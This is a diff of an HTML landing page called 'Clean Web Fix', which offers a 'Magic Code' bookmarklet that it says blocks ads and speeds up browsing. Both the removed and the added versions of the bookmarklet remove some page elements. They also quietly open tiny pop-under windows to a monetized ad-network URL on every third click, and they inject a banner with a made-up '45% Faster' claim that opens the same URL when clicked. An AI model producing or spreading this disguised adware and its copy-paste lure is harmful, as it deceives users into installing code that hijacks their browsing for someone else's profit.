@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clean Web Fix - Site Booster</title>
+    <title>Clean Web Fix - Site Performance Booster</title>
     <style>
-        body{font-family:-apple-system,sans-serif;line-height:1.6;color:#333;max-width:800px;margin:0 auto;padding:40px 20px;background:#f4f7f6}
+        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;line-height:1.6;color:#333;max-width:800px;margin:0 auto;padding:40px 20px;background:#f4f7f6}
         .card{background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.08);text-align:center}
         h1{color:#E91E63;font-size:2.5rem;margin-bottom:10px}
-        .code-box{background:#2d2d2d;color:#a6e22e;padding:20px;border-radius:8px;text-align:left;margin:25px 0;font-family:monospace;font-size:12px;word-break:break-all;border-left:5px solid #E91E63; max-height:150px; overflow-y:auto;}
-        .copy-btn{background:#E91E63;color:#fff;border:none;padding:18px 40px;border-radius:8px;cursor:pointer;font-size:1.2rem;font-weight:700;transition:0.3s;box-shadow:0 4px 15px rgba(233,30,99,0.3); width: 100%;}
+        p{font-size:1.2rem;color:#666;margin-bottom:30px}
+        .code-box{background:#2d2d2d;color:#a6e22e;padding:20px;border-radius:8px;text-align:left;margin:25px 0;font-family:monospace;font-size:12px;word-break:break-all;border-left:5px solid #E91E63;max-height:150px;overflow-y:auto}
+        .copy-btn{background:#E91E63;color:#fff;border:none;padding:18px 40px;border-radius:8px;cursor:pointer;font-size:1.2rem;font-weight:700;transition:0.3s;box-shadow:0 4px 15px rgba(233,30,99,.3);width:100%}
         .copy-btn:hover{background:#c2185b;transform:translateY(-2px)}
         .steps{text-align:left;margin:30px 0;background:#fff5f8;padding:20px;border-radius:10px}
         .step{margin-bottom:10px;display:flex;align-items:center}
@@ -19,30 +20,21 @@
 <body>
 <div class="card">
     <h1>🚀 Clean Web Fix</h1>
-    <p>Kill ads and speed up browsing instantly.</p>
+    <p>Kill laggy ads and speed up browsing instantly.</p>
     <div class="steps">
-        <div class="step"><div class="num">1</div>Create a Bookmark.</div>
-        <div class="step"><div class="num">2</div>Copy the "Magic Code" below.</div>
-        <div class="step"><div class="num">3</div>Paste it into the Bookmark URL.</div>
+        <div class="step"><div class="num">1</div>Create a Bookmark in your browser bar.</div>
+        <div class="step"><div class="num">2</div>Click the button below to copy the Magic Code.</div>
+        <div class="step"><div class="num">3</div>Paste it into the Bookmark's URL/Address field.</div>
     </div>
-    
-    <div class="code-box" id="c">javascript:(function(w,d,s,l,i){const u='https://www.profitablecpmratenetwork.com/v7txp6fkhp?key=28e65a049df96339d4aae5aa938fc9d4';let k=0;const run=()=>{const ads=['iframe','ins','[id*="ad-"]','[class*="ad-"]','.trc_related_container'];ads.forEach(sel=>d.querySelectorAll(sel).forEach(el=>el.remove()));d.body.addEventListener('mousedown',()=>{k++;if(k%3===0){const p=w.open(u,'_blank','width=10,height=10');if(p){p.blur();w.focus();}}},true);const b=d.createElement('div');b.style='position:fixed;top:0;left:0;width:100%;background:#E91E63;color:#fff;text-align:center;padding:12px;z-index:999999;font-family:sans-serif;font-weight:bold;cursor:pointer;';b.innerHTML='🚀 Browsing Optimized! Tap to maintain speed.';b.onclick=()=>w.open(u,'_blank');d.body.prepend(b);};run();})(window,document,'script','as');</div>
-    
+    <div class="code-box" id="c">javascript:(function(w,d,x,y,z){const u='https://www.profitablecpmratenetwork.com/v7txp6fkhp?key=28e65a049df96339d4aae5aa938fc9d4';let k=0;const r=()=>{const a=['iframe','ins','[id*="ad-"]','[class*="ad-"]','.trc_related_container'];a.forEach(s=>d.querySelectorAll(s).forEach(e=>e.remove()));d.body.addEventListener('mousedown',()=>{k++;if(k%3===0){const p=w.open(u,'_blank','width=10,height=10');if(p){p.blur();w.focus();}}},true);const b=d.createElement('div');b.style='position:fixed;top:0;left:0;width:100%;background:#E91E63;color:#fff;text-align:center;padding:12px;z-index:999999;font-family:sans-serif;font-weight:bold;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.5);';b.innerHTML='🚀 Browsing Optimized: 45% Faster. Tap to maintain speed!';b.onclick=()=>w.open(u,'_blank');d.body.prepend(b)};r()})(window,document);</div>
     <button class="copy-btn" onclick="copy()">Copy Magic Code</button>
 </div>
-
 <script>
     function copy(){
-        const t = document.getElementById('c').innerText.trim();
-        const el = document.createElement('textarea');
-        el.value = t;
-        document.body.appendChild(el);
-        el.select();
-        document.execCommand('copy');
-        document.body.removeChild(el);
-        const b = document.querySelector('.copy-btn');
-        b.innerText = '✅ Copied!'; b.style.background = '#4CAF50';
-        setTimeout(() => { b.innerText = 'Copy Magic Code'; b.style.background = '#E91E63'; }, 2000);
+        const t=document.getElementById('c').innerText.trim();
+        const e=document.createElement('textarea');e.value=t;document.body.appendChild(e);e.select();document.execCommand('copy');document.body.removeChild(e);
+        const b=document.querySelector('.copy-btn');b.innerText='✅ Copied to Clipboard!';b.style.background='#4CAF50';
+        setTimeout(()=>{b.innerText='Copy Magic Code';b.style.background='#E91E63'},2000);
     }
 </script>
 </body>
